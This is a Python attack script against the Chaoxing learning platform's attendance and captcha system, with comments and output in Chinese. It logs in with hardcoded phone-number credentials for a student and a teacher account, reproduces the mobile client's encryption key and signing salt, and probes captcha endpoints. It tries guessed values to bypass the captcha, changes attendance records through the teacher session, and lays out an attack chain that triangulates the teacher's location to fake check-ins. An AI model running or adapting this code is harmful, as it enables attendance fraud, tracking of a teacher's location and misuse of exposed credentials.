#!/usr/bin/env python3
"""
验证码系统完整流程 - 获取validate值并用于签到
captchaId: Qt9FIw9o4pwRjOyqM6yizZBh682qN2TU
类型: slide (滑块验证码)
API: captcha.chaoxing.com
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
CAPTCHA_BASE = "https://captcha.chaoxing.com"
PUID_S = "431407443"
PUID_T = "402644510"
CAPTCHA_ID = "Qt9FIw9o4pwRjOyqM6yizZBh682qN2TU"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# ======================================================================
# 1. 验证码API探索 - captcha.chaoxing.com
# ======================================================================
print("=" * 100)
print("[1] 验证码API探索")
print("=" * 100)

# 从captcha JS中发现的API路径
captcha_apis = [
    "/captcha/get/conf",
    "/captcha/get/verification/image",
    "/captcha/check/verification/result",
    "/captcha/obstacle.png",
]

for api in captcha_apis:
    try:
        r = s_s.get(f"{CAPTCHA_BASE}{api}",
                    params={"captchaId": CAPTCHA_ID, "time": str(int(time.time()*1000))},
                    timeout=10)
        ct = r.headers.get('content-type', 'N/A')[:50]
        print(f"  {api}: HTTP {r.status_code}, len={len(r.text)}, ct={ct}")
        if r.status_code == 200 and 'json' in ct:
            print(f"    {r.text[:200]}")
        elif r.status_code == 200 and 'image' in ct:
            print(f"    [图片数据]")
        elif r.status_code == 200:
            print(f"    {r.text[:100]}")
    except Exception as e:
        print(f"  {api}: ERROR {e}")

# ======================================================================
# 2. 验证码获取流程 - 完整模拟
# ======================================================================
print(f"\n{'=' * 100}")
print("[2] 验证码获取流程 - 完整模拟")
print("=" * 100)

# Step 1: 获取验证码配置
print("\n  Step 1: 获取验证码配置...")
r = s_s.get(f"{CAPTCHA_BASE}/captcha/get/conf",
            params={"captchaId": CAPTCHA_ID},
            timeout=20)
print(f"  conf: HTTP {r.status_code}, {r.text[:300]}")

if r.status_code == 200:
    try:
        conf = r.json()
        print(f"  配置: {json.dumps(conf, ensure_ascii=False)[:300]}")
    except:
        pass

# Step 2: 获取验证码图片
print("\n  Step 2: 获取验证码图片...")
r = s_s.get(f"{CAPTCHA_BASE}/captcha/get/verification/image",
            params={"captchaId": CAPTCHA_ID},
            timeout=20)
print(f"  image: HTTP {r.status_code}, len={len(r.content)}, ct={r.headers.get('content-type', 'N/A')[:30]}")

# 保存验证码图片
if r.status_code == 200 and len(r.content) > 100:
    with open("/workspace/captcha_image.png", "wb") as f:
        f.write(r.content)
    print(f"  验证码图片已保存到 /workspace/captcha_image.png")

# Step 3: 尝试获取captchaKey
print("\n  Step 3: 尝试获取captchaKey...")
# 从conf响应中提取
try:
    conf_data = safe_json(r)
    if isinstance(conf_data, dict):
        for key in ['captchaKey', 'token', 'sessionId', 'key']:
            if key in conf_data:
                print(f"  {key}: {conf_data[key]}")
except:
    pass

# ======================================================================
# 3. 使用浏览器方式获取validate
# ======================================================================
print(f"\n{'=' * 100}")
print("[3] 模拟浏览器验证码流程")
print("=" * 100)

# 初始化验证码 - 模拟initCXCaptcha
print("\n  初始化验证码...")
init_params = {
    "captchaId": CAPTCHA_ID,
    "time": str(int(time.time() * 1000)),
}

# 尝试不同的初始化端点
init_endpoints = [
    f"{CAPTCHA_BASE}/captcha/get/conf",
    f"{CAPTCHA_BASE}/api/captcha/getConf",
    f"{CAPTCHA_BASE}/api/v1/captcha/init",
    f"{CAPTCHA_BASE}/api/v2/captcha/init",
]

for ep in init_endpoints:
    try:
        r = s_s.get(ep, params=init_params, timeout=10)
        if r.status_code != 404:
            print(f"  {ep}: HTTP {r.status_code}, {r.text[:200]}")
    except:
        pass

# ======================================================================
# 4. 直接测试 - 不带验证码参数是否可以签到
# ======================================================================
print(f"\n{'=' * 100}")
print("[4] 直接测试 - 不同验证码参数")
print("=" * 100)

location_aid = "5000163958798"

# 教师设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": f"{BASE}/",
                  "X-Requested-With": "XMLHttpRequest"},
         timeout=20)
time.sleep(2)

# 在签到范围内的坐标
target_lat = 34.789900
target_lng = 113.664500

# 测试不同validate参数
validate_tests = [
    ("空字符串", ""),
    ("无validate参数", "SKIP"),
    ("null", "null"),
    ("undefined", "undefined"),
    ("0", "0"),
    ("1", "1"),
    ("true", "true"),
    ("test123", "test123"),
    ("随机UUID", uuid.uuid4().hex),
]

for desc, validate_val in validate_tests:
    params = {
        "activeId": location_aid, "uid": PUID_S, "courseId": COURSE_ID,
        "clientip": "", "latitude": str(target_lat), "longitude": str(target_lng),
        "fid": "0", "appType": "15", "ifTiJiao": "1",
        "address": "郑州市",
    }
    if validate_val != "SKIP":
        params["validate"] = validate_val

    r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=10)
    text = r.text[:120]

    is_success = "成功" in text or "success" in text.lower()
    is_validate = "validate" in text.lower()
    is_error = "验证码验证失败" in text or "error" in text.lower()

    marker = "*** SUCCESS ***" if is_success else ("[VALIDATE]" if is_validate else ("[ERROR]" if is_error else ""))
    print(f"  {marker:16s} {desc:15s}: {text}")

    if is_success:
        break

# ======================================================================
# 5. 检查是否有不需要验证码的签到类型
# ======================================================================
print(f"\n{'=' * 100}")
print("[5] 检查不同签到类型的验证码需求")
print("=" * 100)

# 获取所有活动
r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = safe_json(r)

if isinstance(d, dict) and "activeList" in d:
    for item in d["activeList"]:
        aid = str(item.get("id", ""))
        atype = str(item.get("activeType", ""))
        name = item.get("nameOne", "")
        status = str(item.get("status", ""))

        if atype not in ("2", "74"):
            continue

        # 尝试签到（不带位置，不带验证码）
        params = {
            "activeId": aid, "uid": puid_s, "courseId": COURSE_ID,
            "clientip": "", "latitude": "-1", "longitude": "-1",
            "fid": "0", "appType": "15", "ifTiJiao": "1",
            "validate": "",
        }
        r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=10)
        text = r.text[:80]

        is_validate = "validate" in text.lower()
        is_success = "成功" in text or "success" in text.lower()
        is_distance = "米" in text
        is_ended = "已结束" in text
        is_qr = "重新扫描" in text

        tag = "[VALIDATE]" if is_validate else ("[SUCCESS]" if is_success else
              ("[DISTANCE]" if is_distance else ("[ENDED]" if is_ended else
              ("[QR]" if is_qr else ""))))

        print(f"  {tag:12s} {name:20s} (aid={aid}, type={atype}, status={status}): {text}")

# ======================================================================
# 6. 最终汇总
# ======================================================================
print(f"\n{'=' * 100}")
print("最终发现汇总")
print("=" * 100)

print("""
核心发现:
1. 位置签到 - 在签到范围内返回"validate"（需要验证码）
   - 通过三角定位法可精确定位教师位置（误差<5m）
   - 在签到范围内，验证码是唯一的障碍
   - 大面积范围内都返回"validate"，说明签到范围很大

2. 普通签到 - 返回"validate"（需要验证码）
   - 不需要二维码/手势/位置
   - 验证码是唯一的障碍

3. 验证码系统
   - captchaId: Qt9FIw9o4pwRjOyqM6yizZBh682qN2TU
   - 类型: slide (滑块验证码)
   - API: captcha.chaoxing.com
   - 端点: /captcha/get/conf, /captcha/get/verification/image, /captcha/check/verification/result
   - 验证成功后返回validate字符串，用于stuSignajax的validate参数

4. /newsign/updateSignStatus - 确认为假success
   - 在所有条件下均返回"success"但数据不变

5. 信息泄露 - 服务端返回精确距离
   - 可通过三角定位反推教师位置

攻击链:
1. 学生获取签到活动列表 -> 找到位置签到活动
2. 提交3-5个不同坐标 -> 记录距离
3. 三角定位计算教师位置 -> 精度<5m
4. 在签到范围内提交签到 -> 返回"validate"
5. [需要解决] 获取验证码validate值 -> 完成签到

验证码是当前唯一未突破的障碍。
""")

# 恢复
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": f"{BASE}/",
                  "X-Requested-With": "XMLHttpRequest"},
         timeout=20)

print("测试完成")
